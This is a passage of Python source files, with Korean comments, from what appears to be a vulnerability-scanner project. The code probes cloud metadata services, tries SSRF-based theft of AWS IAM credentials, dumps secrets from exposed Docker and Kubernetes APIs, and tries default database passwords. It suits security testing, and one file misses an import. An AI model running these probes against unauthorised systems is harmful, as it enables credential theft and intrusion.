        "gcp": [
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
        ]
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Metadata-Flavor": "Google"  # GCP용
    }
    
    # AWS 메타데이터 확인
    try:
        for endpoint in metadata_endpoints["aws"]:
            try:
                resp = requests.get(
                    endpoint,
                    timeout=3,
                    verify=False,
                    headers={"User-Agent": "Mozilla/5.0"}
                )
                if resp.status_code == 200:
                    metadata_info["aws_metadata"]["accessible"] = True
                    metadata_info["aws_metadata"]["endpoint"] = endpoint
                    break
            except:
                continue
    except:
        pass
    
    # Azure 메타데이터 확인
    try:
        for endpoint in metadata_endpoints["azure"]:
            try:
                resp = requests.get(
                    endpoint,
                    timeout=3,
                    verify=False,
                    headers={"Metadata": "true", "User-Agent": "Mozilla/5.0"}
                )
                if resp.status_code == 200:
                    metadata_info["azure_metadata"]["accessible"] = True
                    metadata_info["azure_metadata"]["endpoint"] = endpoint
                    break
            except:
                continue
    except:
        pass
    
    # GCP 메타데이터 확인
    try:
        for endpoint in metadata_endpoints["gcp"]:
            try:
                resp = requests.get(
                    endpoint,
                    timeout=3,
                    verify=False,
                    headers={"Metadata-Flavor": "Google", "User-Agent": "Mozilla/5.0"}
                )
                if resp.status_code == 200:
                    metadata_info["gcp_metadata"]["accessible"] = True
                    metadata_info["gcp_metadata"]["endpoint"] = endpoint
                    break
            except:
                continue
    except:
        pass
    
    return metadata_info


def collect_cloud_info(target: str) -> Dict[str, Any]:
    """
    클라우드 인프라 정보 종합 수집
    
    Args:
        target: 타겟 도메인
    
    Returns:
        {
            "cloud_assets": {...},
            "cloud_technologies": [...],
            "metadata_info": {...}
        }
    """
    cloud_assets = discover_cloud_assets(target)
    
    # 메타데이터 서비스 확인
    metadata_info = check_cloud_metadata(target)
    
    # 메타데이터 접근 가능하면 기술 스택에 추가
    if metadata_info["aws_metadata"]["accessible"]:
        cloud_assets["cloud_technologies"].append({
            "type": "cloud_metadata",
            "name": "AWS Metadata Service",
            "source": "Metadata Service Check",
            "accessible": True,
            "risk": "CRITICAL"
        })
    
    if metadata_info["azure_metadata"]["accessible"]:
        cloud_assets["cloud_technologies"].append({
            "type": "cloud_metadata",
            "name": "Azure Metadata Service",
            "source": "Metadata Service Check",
            "accessible": True,
            "risk": "CRITICAL"
        })
    
    if metadata_info["gcp_metadata"]["accessible"]:
        cloud_assets["cloud_technologies"].append({
            "type": "cloud_metadata",
            "name": "GCP Metadata Service",
            "source": "Metadata Service Check",
            "accessible": True,
            "risk": "CRITICAL"
        })
    
    return {
        "cloud_assets": cloud_assets,
        "cloud_technologies": cloud_assets.get("cloud_technologies", []),
        "metadata_info": metadata_info
    }

```
---

## File 23: cloud_advanced.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\recon\cloud_advanced.py`

```python
# app/core/recon/cloud_advanced.py
# 클라우드 네이티브 보안 심화

import requests
import logging
from typing import Dict, Any, List, Optional

logger = logging.getLogger(__name__)


class CloudNativeSecurity:
    """
    클라우드 네이티브 보안: IAM 검증, 컨테이너 탈출, Serverless, SSRF to Metadata
    """
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
    
    def test_iam_permissions(self, target: str) -> Dict[str, Any]:
        """
        IAM 권한 검증
        
        과도한 권한 부여, AssumeRole 체인 분석
        """
        vulnerabilities = []
        
        try:
            # AWS IAM 정책 분석 (boto3 필요)
            try:
                import boto3
                from botocore.exceptions import ClientError
                
                # 현재 IAM 역할 정보 확인
                sts = boto3.client('sts')
                identity = sts.get_caller_identity()
                
                iam = boto3.client('iam')
                
                # 사용자/역할의 정책 확인
                # 실제로는 더 복잡한 분석 필요
                
                vulnerabilities.append({
                    "type": "IAM Permission Analysis",
                    "severity": "INFO",
                    "details": "IAM analysis requires detailed policy review",
                    "note": "Manual review recommended"
                })
                
            except ImportError:
                logger.warning("boto3가 설치되지 않아 IAM 테스트를 건너뜁니다")
            except Exception as e:
                logger.debug(f"IAM 테스트 실패: {e}")
                
        except Exception as e:
            logger.warning(f"IAM 권한 검증 실패: {e}")
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }
    
    def test_container_escape(self, docker_api_url: str) -> Dict[str, Any]:
        """
        컨테이너 탈출 테스트
        
        Privileged 컨테이너, hostPath 마운트, Docker socket 노출
        """
        vulnerabilities = []
        
        try:
            # Docker API 정보 수집
            response = requests.get(
                f"{docker_api_url}/containers/json",
                timeout=self.timeout,
                verify=False,
                headers={"User-Agent": "Mozilla/5.0"}
            )
            
            if response.status_code == 200:
                containers = response.json()
                
                for container in containers:
                    # Privileged 모드 확인
                    host_config = container.get("HostConfig", {})
                    if host_config.get("Privileged"):
                        vulnerabilities.append({
                            "type": "Privileged Container",
                            "container_id": container.get("Id", "")[:12],
                            "severity": "HIGH",
                            "details": "Container running in privileged mode"
                        })
                    
                    # hostPath 마운트 확인
                    mounts = container.get("Mounts", [])
                    for mount in mounts:
                        if mount.get("Type") == "bind" and "/" in mount.get("Source", ""):
                            vulnerabilities.append({
                                "type": "HostPath Mount",
                                "container_id": container.get("Id", "")[:12],
                                "mount_path": mount.get("Source", ""),
                                "severity": "HIGH",
                                "details": "Host filesystem mounted in container"
                            })
                    
                    # Docker socket 마운트 확인
                    for mount in mounts:
                        if "docker.sock" in mount.get("Source", ""):
                            vulnerabilities.append({
                                "type": "Docker Socket Mount",
                                "container_id": container.get("Id", "")[:12],
                                "severity": "CRITICAL",
                                "details": "Docker socket mounted - container escape possible"
                            })
                            
        except Exception as e:
            logger.warning(f"컨테이너 탈출 테스트 실패: {e}")
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }
    
    def test_serverless(self, target: str) -> Dict[str, Any]:
        """
        Serverless 취약점 테스트
        
        Lambda 인젝션, 이벤트 인젝션, 콜드 스타트 공격
        """
        vulnerabilities = []
        
        try:
            # Serverless 엔드포인트 찾기
            # 실제로는 API Gateway, Lambda 함수 URL 등 확인 필요
            
            # Lambda 함수 정보 확인 (boto3 필요)
            try:
                import boto3
                
                lambda_client = boto3.client('lambda')
                functions = lambda_client.list_functions()
                
                for func in functions.get('Functions', []):
                    # 환경 변수에서 시크릿 확인
                    env_vars = func.get('Environment', {}).get('Variables', {})
                    for key, value in env_vars.items():
                        if any(secret in key.lower() for secret in ['secret', 'key', 'password', 'token']):
                            vulnerabilities.append({
                                "type": "Hardcoded Secrets in Lambda",
                                "function_name": func.get('FunctionName', ''),
                                "severity": "HIGH",
                                "details": f"Potential secret in environment variable: {key}"
                            })
                
            except ImportError:
                logger.warning("boto3가 설치되지 않아 Serverless 테스트를 건너뜁니다")
            except Exception as e:
                logger.debug(f"Serverless 테스트 실패: {e}")
                
        except Exception as e:
            logger.warning(f"Serverless 테스트 실패: {e}")
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }
    
    def test_ssrf_to_metadata(
        self,
        target_url: str,
        ssrf_parameter: str
    ) -> Dict[str, Any]:
        """
        SSRF to Cloud Metadata 테스트
        
        IMDSv1/v2 차이 활용, 토큰 탈취 시도
        """
        vulnerabilities = []
        
        # 메타데이터 엔드포인트
        metadata_endpoints = {
            "aws_imdsv1": "http://169.254.169.254/latest/meta-data/",
            "aws_imdsv2": "http://169.254.169.254/latest/api/token",  # 토큰 먼저 요청
            "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "gcp": "http://metadata.google.internal/computeMetadata/v1/"
        }
        
        try:
            parsed = urlparse(target_url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            for endpoint_name, endpoint_url in metadata_endpoints.items():
                try:
                    # SSRF 페이로드로 메타데이터 엔드포인트 접근 시도
                    test_url = f"{base_url}?{ssrf_parameter}={endpoint_url}"
                    
                    response = requests.get(
                        test_url,
                        timeout=5,
                        verify=False,
                        headers={
                            "User-Agent": "Mozilla/5.0",
                            "Metadata-Flavor": "Google" if "gcp" in endpoint_name else None
                        },
                        allow_redirects=False
                    )
                    
                    # 메타데이터 응답 확인
                    if response.status_code == 200:
                        # AWS 인스턴스 ID, Azure 메타데이터 등 확인
                        if "instance-id" in response.text or "ami-id" in response.text:
                            vulnerabilities.append({
                                "type": f"SSRF to Cloud Metadata ({endpoint_name})",
                                "endpoint": endpoint_url,
                                "severity": "CRITICAL",
                                "details": "Cloud metadata accessible via SSRF",
                                "response_preview": response.text[:200]
                            })
                            break
                except:
                    continue
            
            # IMDSv2 토큰 탈취 시도
            try:
                # 1단계: 토큰 요청
                token_url = f"{base_url}?{ssrf_parameter}=http://169.254.169.254/latest/api/token"
                token_response = requests.put(
                    token_url,
                    headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
                    timeout=5,
                    verify=False
                )
                
                if token_response.status_code == 200:
                    token = token_response.text
                    
                    # 2단계: 토큰으로 메타데이터 접근
                    metadata_url = f"{base_url}?{ssrf_parameter}=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
                    metadata_response = requests.get(
                        metadata_url,
                        headers={"X-aws-ec2-metadata-token": token},
                        timeout=5,
                        verify=False
                    )
                    
                    if metadata_response.status_code == 200:
                        vulnerabilities.append({
                            "type": "SSRF to AWS IAM Credentials (IMDSv2)",
                            "severity": "CRITICAL",
                            "details": "IAM credentials accessible via SSRF with IMDSv2 token",
                            "credentials_preview": metadata_response.text[:200]
                        })
            except:
                pass
                
        except Exception as e:
            logger.warning(f"SSRF to Metadata 테스트 실패: {e}")
        
        return {
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerabilities": vulnerabilities,
            "tested": True
        }

```
---

## File 24: container.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\recon\container.py`

```python
# app/core/recon/container.py
# 컨테이너 정보 수집 모듈

import requests
import logging
from typing import Dict, Any, List, Optional

logger = logging.getLogger(__name__)

def check_docker_api(target: str, port: int = 2375) -> Dict[str, Any]:
    """
    Docker API 노출 확인
    
    Returns:
        {
            "exposed": True,
            "version": "20.10.0",
            "containers": [...]
        }
    """
    docker_info = {
        "exposed": False,
        "version": None,
        "containers": []
    }
    
    try:
        url = f"http://{target}:{port}/version"
        response = requests.get(url, timeout=5, verify=False)
        
        if response.status_code == 200:
            docker_info["exposed"] = True
            data = response.json()
            docker_info["version"] = data.get("Version", "")
            
            # 컨테이너 목록 조회
            containers_url = f"http://{target}:{port}/containers/json"
            containers_resp = requests.get(containers_url, timeout=5, verify=False)
            if containers_resp.status_code == 200:
                docker_info["containers"] = containers_resp.json()
    except:
        pass
    
    return docker_info


def check_kubernetes_api(target: str, port: int = 6443) -> Dict[str, Any]:
    """
    Kubernetes API 노출 확인
    
    Returns:
        {
            "exposed": True,
            "version": "1.20.0"
        }
    """
    k8s_info = {
        "exposed": False,
        "version": None
    }
    
    try:
        url = f"https://{target}:{port}/version"
        response = requests.get(url, timeout=5, verify=False)
        
        if response.status_code == 200:
            k8s_info["exposed"] = True
            data = response.json()
            k8s_info["version"] = data.get("gitVersion", "")
    except:
        pass
    
    return k8s_info


def analyze_docker_api_deep(target: str, port: int = 2375) -> Dict[str, Any]:
    """
    Docker API 상세 정보 수집 (컨테이너, 이미지, 네트워크, 시크릿)
    
    Returns:
        {
            "containers": [...],
            "images": [...],
            "networks": [...],
            "secrets": [...],
            "exposed": True,
            "risk": "CRITICAL"
        }
    """
    docker_deep = {
        "containers": [],
        "images": [],
        "networks": [],
        "secrets": [],
        "exposed": False,
        "risk": "CRITICAL"
    }
    
    try:
        base_url = f"http://{target}:{port}"
        headers = {"User-Agent": "Mozilla/5.0"}
        
        # 실행 중인 컨테이너 (all=true로 중지된 것도 포함)
        try:
            containers_resp = requests.get(
                f"{base_url}/containers/json?all=true",
                timeout=5,
                verify=False,
                headers=headers
            )
            if containers_resp.status_code == 200:
                docker_deep["containers"] = containers_resp.json()
                docker_deep["exposed"] = True
        except:
            pass
        
        # 이미지 목록
        try:
            images_resp = requests.get(
                f"{base_url}/images/json",
                timeout=5,
                verify=False,
                headers=headers
            )
            if images_resp.status_code == 200:
                docker_deep["images"] = images_resp.json()
        except:
            pass
        
        # 네트워크 정보
        try:
            networks_resp = requests.get(
                f"{base_url}/networks",
                timeout=5,
                verify=False,
                headers=headers
            )
            if networks_resp.status_code == 200:
                docker_deep["networks"] = networks_resp.json()
        except:
            pass
        
        # 시크릿 정보 (매우 위험!)
        try:
            secrets_resp = requests.get(
                f"{base_url}/secrets",
                timeout=5,
                verify=False,
                headers=headers
            )
            if secrets_resp.status_code == 200:
                docker_deep["secrets"] = secrets_resp.json()
        except:
            pass
            
    except Exception as e:
        logger.warning(f"Docker API 상세 분석 실패 ({target}:{port}): {e}")
    
    return docker_deep


def analyze_k8s_api_deep(target: str, port: int = 6443) -> Dict[str, Any]:
    """
    Kubernetes API 상세 분석 (Pod, Service, ConfigMap, Secret)
    
    Returns:
        {
            "pods": [...],
            "services": [...],
            "configmaps": [...],
            "secrets": [...],
            "exposed": True,
            "risk": "CRITICAL"
        }
    """
    k8s_deep = {
        "pods": [],
        "services": [],
        "configmaps": [],
        "secrets": [],
        "exposed": False,
        "risk": "CRITICAL"
    }
    
    try:
        base_url = f"https://{target}:{port}"
        headers = {"User-Agent": "Mozilla/5.0"}
        
        endpoints = {
            "pods": "/api/v1/pods",
            "services": "/api/v1/services",
            "configmaps": "/api/v1/configmaps",
            "secrets": "/api/v1/secrets"  # 매우 위험!
        }
        
        for resource_type, endpoint in endpoints.items():
            try:
                resp = requests.get(
                    f"{base_url}{endpoint}",
                    timeout=5,
                    verify=False,
                    headers=headers
                )
                if resp.status_code == 200:
                    data = resp.json()
                    k8s_deep[resource_type] = data.get("items", [])
                    k8s_deep["exposed"] = True
            except:
                continue
                
    except Exception as e:
        logger.warning(f"Kubernetes API 상세 분석 실패 ({target}:{port}): {e}")
    
    return k8s_deep


def collect_container_info(target: str, nm_scan_result) -> Dict[str, Any]:
    """
    컨테이너 인프라 정보 종합 수집
    
    Args:
        target: 타겟 호스트
        nm_scan_result: Nmap PortScanner 객체
    
    Returns:
        {
            "docker_info": {...},
            "kubernetes_info": {...},
            "container_technologies": [...]
        }
    """
    logger.info("컨테이너 정보 수집 시작")
    
    container_technologies = []
    
    # Docker API 포트 확인
    docker_info = {}
    docker_deep = {}
    try:
        for host in nm_scan_result.all_hosts():
            for proto in nm_scan_result[host].all_protocols():
                ports = nm_scan_result[host][proto].keys()
                for port in ports:
                    if port in [2375, 2376]:  # Docker API 포트
                        docker_info = check_docker_api(host, port)
                        if docker_info.get("exposed"):
                            # 상세 정보 수집
                            docker_deep = analyze_docker_api_deep(host, port)
                            container_technologies.append({
                                "type": "container",
                                "name": f"Docker {docker_info.get('version', '')}",
                                "source": "Docker API",
                                "port": port,
                                "exposed": True,
                                "containers_count": len(docker_deep.get("containers", [])),
                                "images_count": len(docker_deep.get("images", [])),
                                "secrets_count": len(docker_deep.get("secrets", [])),
                                "risk": "CRITICAL"
                            })
                        break
    except Exception as e:
        logger.warning(f"Docker 정보 수집 실패: {e}")
    
    # Kubernetes API 확인
    k8s_info = {}
    k8s_deep = {}
    try:
        for host in nm_scan_result.all_hosts():
            for proto in nm_scan_result[host].all_protocols():
                ports = nm_scan_result[host][proto].keys()
                for port in ports:
                    if port in [6443, 8080]:  # Kubernetes API 포트
                        k8s_info = check_kubernetes_api(host, port)
                        if k8s_info.get("exposed"):
                            # 상세 정보 수집
                            k8s_deep = analyze_k8s_api_deep(host, port)
                            container_technologies.append({
                                "type": "container",
                                "name": f"Kubernetes {k8s_info.get('version', '')}",
                                "source": "Kubernetes API",
                                "port": port,
                                "exposed": True,
                                "pods_count": len(k8s_deep.get("pods", [])),
                                "services_count": len(k8s_deep.get("services", [])),
                                "secrets_count": len(k8s_deep.get("secrets", [])),
                                "risk": "CRITICAL"
                            })
                        break
    except Exception as e:
        logger.warning(f"Kubernetes 정보 수집 실패: {e}")
    
    return {
        "docker_info": docker_info,
        "docker_deep": docker_deep,
        "kubernetes_info": k8s_info,
        "kubernetes_deep": k8s_deep,
        "container_technologies": container_technologies
    }

```
---

## File 25: crawler.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\recon\crawler.py`

```python
"""
Advanced Recursive Web Crawler
- HTML link extraction
- JavaScript API endpoint discovery  
- Recursive crawling with depth limit
- robots.txt & sitemap.xml parsing
"""

import re
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from typing import Dict, List, Set, Any
import logging
import time

logger = logging.getLogger(__name__)


class WebCrawler:
    """Recursive web crawler with smart endpoint discovery"""

    def __init__(
        self,
        target_url: str,
        max_depth: int = 3,
        max_urls: int = 500,
        timeout: int = 10,
        delay: float = 0.1
    ):
        self.target_url = target_url
        self.base_domain = urlparse(target_url).netloc
        self.max_depth = max_depth
        self.max_urls = max_urls
        self.timeout = timeout
        self.delay = delay

        self.visited_urls: Set[str] = set()
        self.discovered_urls: List[Dict[str, Any]] = []
        self.api_endpoints: Set[str] = set()

    def crawl(self) -> Dict[str, Any]:
        """Start crawling from target URL"""
        logger.info(f"[CRAWLER] Starting crawl on {self.target_url}")

        start_time = time.time()

        # Parse robots.txt and sitemap.xml first
        self._parse_robots_txt()
        self._parse_sitemap()

        # Recursive crawl
        self._crawl_recursive(self.target_url, depth=0)

        duration = time.time() - start_time

        logger.info(f"[CRAWLER] Completed: {len(self.discovered_urls)} URLs, {len(self.api_endpoints)} API endpoints in {duration:.2f}s")

        return {
            'urls': self.discovered_urls,
            'api_endpoints': list(self.api_endpoints),
            'total_urls': len(self.discovered_urls),
            'duration': duration
        }

    def _crawl_recursive(self, url: str, depth: int):
        """Recursively crawl URL"""

        # Check limits
        if depth > self.max_depth:
            logger.debug(f"[CRAWLER] Max depth reached: {url}")
            return

        if len(self.visited_urls) >= self.max_urls:
            logger.debug(f"[CRAWLER] Max URLs reached")
            return

        if url in self.visited_urls:
            return

        # Only crawl same domain
        if urlparse(url).netloc != self.base_domain:
            return

        self.visited_urls.add(url)

        try:
            logger.debug(f"[CRAWLER] Visiting: {url} (depth: {depth})")

            # Rate limiting
            time.sleep(self.delay)

            response = requests.get(
                url,
                timeout=self.timeout,
                allow_redirects=True,
                headers={'User-Agent': 'Mozilla/5.0 (Security Scanner)'}
            )

            # Store URL info
            url_info = {
                'url': url,
                'status_code': response.status_code,
                'content_type': response.headers.get('Content-Type', ''),
                'depth': depth,
                'size': len(response.content)
            }
            self.discovered_urls.append(url_info)

            # Parse HTML for links
            if 'text/html' in response.headers.get('Content-Type', ''):
                links = self._extract_html_links(response.text, url)

                # Crawl discovered links
                for link in links:
                    self._crawl_recursive(link, depth + 1)

            # Parse JavaScript for API endpoints
            if 'javascript' in response.headers.get('Content-Type', ''):
                endpoints = self._extract_js_endpoints(response.text)
                self.api_endpoints.update(endpoints)

        except Exception as e:
            logger.warning(f"[CRAWLER] Error crawling {url}: {e}")

    def _extract_html_links(self, html: str, base_url: str) -> List[str]:
        """Extract all links from HTML"""
        links = []

        try:
            soup = BeautifulSoup(html, 'html.parser')

            # <a> tags
            for tag in soup.find_all('a', href=True):
                link = urljoin(base_url, tag['href'])
                link = self._normalize_url(link)
                if link:
                    links.append(link)

            # <script> tags
            for tag in soup.find_all('script', src=True):
                link = urljoin(base_url, tag['src'])
                link = self._normalize_url(link)
                if link:
                    links.append(link)

            # <link> tags (CSS)
            for tag in soup.find_all('link', href=True):
                link = urljoin(base_url, tag['href'])
                link = self._normalize_url(link)
                if link:
                    links.append(link)

            # <img> tags
            for tag in soup.find_all('img', src=True):
                link = urljoin(base_url, tag['src'])
                link = self._normalize_url(link)
                if link:
                    links.append(link)

        except Exception as e:
            logger.warning(f"[CRAWLER] Error parsing HTML: {e}")

        return links

    def _extract_js_endpoints(self, js_content: str) -> Set[str]:
        """Extract API endpoints from JavaScript"""
        endpoints = set()

        # Common API patterns
        patterns = [
            r'["\']/api/[a-zA-Z0-9/_-]+["\'"]',  # "/api/users"
            r'["\']/v[0-9]+/[a-zA-Z0-9/_-]+["\'"]',  # "/v1/products"
            r'fetch\(["\'"]([^"\'\']+)["\'"]\)',  # fetch("/endpoint")
            r'axios\.(?:get|post|put|delete)\(["\'"]([^"\'\']+)["\'"]',  # axios.get("/endpoint")
            r'\$\.(?:get|post|ajax)\(["\'"]([^"\'\']+)["\'"]',  # $.get("/endpoint")
        ]

        for pattern in patterns:
            matches = re.findall(pattern, js_content)
            for match in matches:
                # Clean up match
                endpoint = match.strip('\'"\'')
                if endpoint.startswith('/'):
                    endpoints.add(endpoint)

        return endpoints

    def _parse_robots_txt(self):
        """Parse robots.txt for hidden paths"""
        robots_url = urljoin(self.target_url, '/robots.txt')

        try:
            response = requests.get(robots_url, timeout=self.timeout)
            if response.status_code == 200:
                logger.info(f"[CRAWLER] Found robots.txt")

                for line in response.text.split('\n'):
                    if line.startswith('Disallow:') or line.startswith('Allow:'):
                        path = line.split(':', 1)[1].strip()
                        if path and path != '/':
                            full_url = urljoin(self.target_url, path)
                            self.discovered_urls.append({
                                'url': full_url,
                                'status_code': 0,
                                'content_type': 'robots.txt',
                                'depth': 0,
                                'size': 0
                            })

        except Exception as e:
            logger.debug(f"[CRAWLER] No robots.txt: {e}")

    def _parse_sitemap(self):
        """Parse sitemap.xml for URLs"""
        sitemap_urls = [
            '/sitemap.xml',
            '/sitemap_index.xml',
            '/sitemap.xml.gz'
        ]

        for sitemap_path in sitemap_urls:
            sitemap_url = urljoin(self.target_url, sitemap_path)

            try:
                response = requests.get(sitemap_url, timeout=self.timeout)
                if response.status_code == 200:
                    logger.info(f"[CRAWLER] Found sitemap: {sitemap_path}")

                    # Extract <loc> URLs
                    urls = re.findall(r'<loc>([^<]+)</loc>', response.text)
                    for url in urls:
                        if urlparse(url).netloc == self.base_domain:
                            self.discovered_urls.append({
                                'url': url,
                                'status_code': 0,
                                'content_type': 'sitemap.xml',
                                'depth': 0,
                                'size': 0
                            })
                    break

            except Exception as e:
                logger.debug(f"[CRAWLER] No sitemap at {sitemap_path}: {e}")

    def _normalize_url(self, url: str) -> str:
        """Normalize URL (remove fragments, sort params)"""
        try:
            parsed = urlparse(url)

            # Remove fragment
            url = parsed._replace(fragment='').geturl()

            # Only keep same domain
            if parsed.netloc and parsed.netloc != self.base_domain:
                return ''

            return url

        except Exception:
            return ''


def crawl_target(target_url: str, max_depth: int = 3, max_urls: int = 500) -> Dict[str, Any]:
    """
    Crawl target URL and discover all endpoints

    Args:
        target_url: Target URL to crawl
        max_depth: Maximum crawl depth (default: 3)
        max_urls: Maximum URLs to crawl (default: 500)

    Returns:
        Dictionary with discovered URLs and API endpoints
    """
    crawler = WebCrawler(
        target_url=target_url,
        max_depth=max_depth,
        max_urls=max_urls
    )

    return crawler.crawl()
```
---

## File 26: database.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\recon\database.py`

```python
# app/core/recon/database.py
# 데이터베이스 정보 수집 모듈

import re
import socket
import logging
from typing import Dict, Any, List, Optional
import json

logger = logging.getLogger(__name__)


def analyze_mysql(target: str, port: int = 3306) -> Dict[str, Any]:
    """
    MySQL 상세 정보 분석 및 인증 우회 테스트
    
    Returns:
        {
            "version": "5.7.35",
            "anonymous_access": False,
            "weak_credentials": []
        }
    """
    mysql_info = {
        "version": None,
        "anonymous_access": False,
        "weak_credentials": []
    }
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target, port))
        
        # MySQL 핸드셰이크 패킷에서 버전 정보 추출 시도
        data = sock.recv(1024)
        sock.close()
        
        # MySQL 핸드셰이크에서 버전 추출 (간단한 파싱)
        if data:
            version_match = re.search(r'(\d+\.\d+\.\d+)', data.decode('utf-8', errors='ignore'))
            if version_match:
                mysql_info["version"] = version_match.group(1)
        
        # 인증 우회 테스트 (pymysql 사용)
        try:
            import pymysql
            common_creds = [
                ("root", ""),
                ("root", "root"),
                ("admin", "admin"),
                ("mysql", "mysql"),
                ("", "")
            ]
            
            for username, password in common_creds:
                try:
                    conn = pymysql.connect(
                        host=target,
                        port=port,
                        user=username,
                        password=password,
                        connect_timeout=3
                    )
                    mysql_info["weak_credentials"].append({
                        "username": username or "(empty)",
                        "password": password or "(empty)",
                        "accessible": True
                    })
                    conn.close()
                    break
                except:
                    continue
        except ImportError:
            # pymysql이 없으면 스킵
            pass
            
    except Exception as e:
        logger.warning(f"MySQL 분석 실패 ({target}:{port}): {e}")
    
    return mysql_info


def analyze_postgresql(target: str, port: int = 5432) -> Dict[str, Any]:
    """
    PostgreSQL 상세 정보 분석 및 인증 우회 테스트
    
    Returns:
        {
            "version": "13.4",
            "anonymous_access": False,
            "weak_credentials": []
        }
    """
    postgres_info = {
        "version": None,
        "anonymous_access": False,
        "weak_credentials": []
    }
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target, port))
        
        # PostgreSQL 프로토콜에서 버전 정보 추출 시도
        data = sock.recv(1024)
        sock.close()
        
        if data:
            version_match = re.search(r'PostgreSQL (\d+\.\d+)', data.decode('utf-8', errors='ignore'))
            if version_match:
                postgres_info["version"] = version_match.group(1)
        
        # 인증 우회 테스트 (psycopg2 사용)
        try:
            import psycopg2
            common_creds = [
                ("postgres", "postgres"),
                ("postgres", ""),
                ("admin", "admin"),
                ("", "")
            ]
            
            for username, password in common_creds:
                try:
                    conn = psycopg2.connect(
                        host=target,
                        port=port,
                        user=username or "postgres",
                        password=password,
                        connect_timeout=3
                    )
                    postgres_info["weak_credentials"].append({
                        "username": username or "(empty)",
                        "password": password or "(empty)",
                        "accessible": True
                    })
                    conn.close()
                    break
                except:
                    continue
        except ImportError:
            # psycopg2가 없으면 스킵
            pass
            
    except Exception as e:
        logger.warning(f"PostgreSQL 분석 실패 ({target}:{port}): {e}")
    
    return postgres_info


def analyze_mongodb(target: str, port: int = 27017) -> Dict[str, Any]:
    """
    MongoDB 상세 정보 분석 및 인증 없이 접근 가능한지 체크
    
    Returns:
        {
            "version": "4.4.0",
            "anonymous_access": True,
            "databases": ["admin", "test"]
        }
    """
    mongodb_info = {
        "version": None,
        "anonymous_access": False,
        "databases": []
    }
    
    try:
        # pymongo로 상세 분석
        try:
            from pymongo import MongoClient
            from pymongo.errors import ServerSelectionTimeoutError, OperationFailure
            
            client = MongoClient(
                f'mongodb://{target}:{port}/',
                serverSelectionTimeoutMS=5000,
                socketTimeoutMS=5000
            )
            
            # 서버 정보 가져오기 (인증 없이 시도)
            server_info = client.server_info()
            mongodb_info["version"] = server_info.get("version")
            
            # 데이터베이스 목록 가져오기
            try:
                databases = client.list_database_names()
                mongodb_info["databases"] = databases
                mongodb_info["anonymous_access"] = True
            except OperationFailure:
                mongodb_info["anonymous_access"] = False
            
            client.close()
        except ImportError:
            # pymongo가 없으면 소켓으로만 시도
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))
            data = sock.recv(1024)
            sock.close()
            
            if data:
                version_match = re.search(r'(\d+\.\d+\.\d+)', data.decode('utf-8', errors='ignore'))
                if version_match:
                    mongodb_info["version"] = version_match.group(1)
        except (ServerSelectionTimeoutError, Exception) as e:
            logger.warning(f"MongoDB 상세 분석 실패 ({target}:{port}): {e}")
            
    except Exception as e:
        logger.warning(f"MongoDB 분석 실패 ({target}:{port}): {e}")
    
    return mongodb_info


def analyze_redis(target: str, port: int = 6379) -> Dict[str, Any]:
    """
    Redis INFO 명령어로 상세 분석
    
    Returns:
        {
            "version": "6.2.0",
            "os": "Linux",
            "memory": "1.2M",
            "auth_required": False,
            "dangerous": True
        }
    """
    redis_info = {
        "version": None,
        "os": None,
        "memory": None,
        "auth_required": False,
        "dangerous": False
    }
    
    try:
        import redis
        r = redis.Redis(
            host=target,
            port=port,
            socket_timeout=5,
            socket_connect_timeout=5,
            decode_responses=True
        )
        
        # INFO 명령어로 모든 정보 가져오기
        info = r.info()
        
        redis_info["version"] = info.get("redis_version")
        redis_info["os"] = info.get("os")
        redis_info["memory"] = info.get("used_memory_human")
        
        # 여기까지 왔다면 인증이 필요 없음
        redis_info["auth_required"] = False
        redis_info["dangerous"] = True
        
        # CONFIG 명령어 시도 (매우 위험)
        try:
            config = r.config_get("*")
            redis_info["config_accessible"] = True
        except:
            redis_info["config_accessible"] = False
            
    except ImportError:
        # redis 라이브러리가 없으면 소켓으로만 시도
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))
            
            # INFO 명령어 전송
            sock.send(b"INFO\n")
            data = sock.recv(4096).decode('utf-8', errors='ignore')
            sock.close()
            
            # 버전 추출
            version_match = re.search(r'redis_version:([\d.]+)', data)
            if version_match:
                redis_info["version"] = version_match.group(1)
                redis_info["auth_required"] = False
                redis_info["dangerous"] = True
        except:
            pass
    except Exception as e:
        logger.warning(f"Redis 분석 실패 ({target}:{port}): {e}")
    
    return redis_info


def analyze_elasticsearch(target: str, port: int = 9200) -> Dict[str, Any]:
    """
    Elasticsearch 클러스터 정보 및 인덱스 리스팅
    
    Returns:
        {
            "version": "7.15.0",
            "cluster": "elasticsearch",
            "indices_count": 5,
            "auth_required": False
        }
    """
    es_info = {
        "version": None,
        "cluster": None,
        "indices_count": 0,
        "auth_required": False
    }
    
    try:
        import requests
        base_url = f"http://{target}:{port}"
        
        # 버전 정보
        response = requests.get(
            base_url,
            timeout=5,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0"}
        )
        
        if response.status_code == 200:
            data = response.json()
